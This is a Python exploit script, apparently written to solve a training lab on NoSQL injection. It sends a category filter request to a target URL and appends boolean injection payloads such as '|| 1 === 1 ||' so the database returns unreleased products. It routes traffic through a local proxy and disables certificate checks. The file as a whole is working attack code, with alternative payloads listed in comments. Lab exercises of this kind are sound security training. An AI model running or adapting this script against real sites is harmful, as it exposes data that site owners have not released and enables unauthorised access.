# Detecting NoSQL injection

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_category(r):
	if 'Pets' in r.text:
		print("\n[+] Found 'Pets' category parameter...\n")
		return 'Pets'
	elif 'Gifts' in r.text:
		print("\n[+] Found 'Gifts' category parameter...\n")
		return 'Gifts'

def get_item_count(r):
	items = len(re.findall(b'\$(.*).(.*)', r.text.encode()))
	print(f"[+] Found {str(items)} items in the database.\n")
	return items

def get_all_items(s, url, category):
	category_path = url + "/filter?category=" + category
	print(f"[+] Trying to send the following GET request:\n\t{category_path}")
	r = s.get(category_path)
	time.sleep(1)
	released_items = get_item_count(r)

# BOOLEAN EXPRESSIONS THAT RETURN TRUE

	# payload = "'|| 1 ||'"
	# payload = "'|| true ||'"
	# payload = "'|| 0 == 0 ||'"
	payload = "'|| 1 === 1 ||'"
	
	category_path += payload
	print(f"[+] Trying to send the following injection request:\n\t{category_path}")
	r = s.get(category_path)
	time.sleep(1)
	items = get_item_count(r)
	if items > released_items + 1 and r.status_code == 200:
		return
	elif r.status_code == 500:
		print('[-] The payload produced a Server Error <!>')
		sys.exit(1)
	else:
		print('[-] The payload did not extract unreleased products <!>\n Try a valid boolean...')
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Detecting NoSQL injection')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to display unreleased products...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			category = get_category(r)
			r = get_all_items(s, url, category)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()

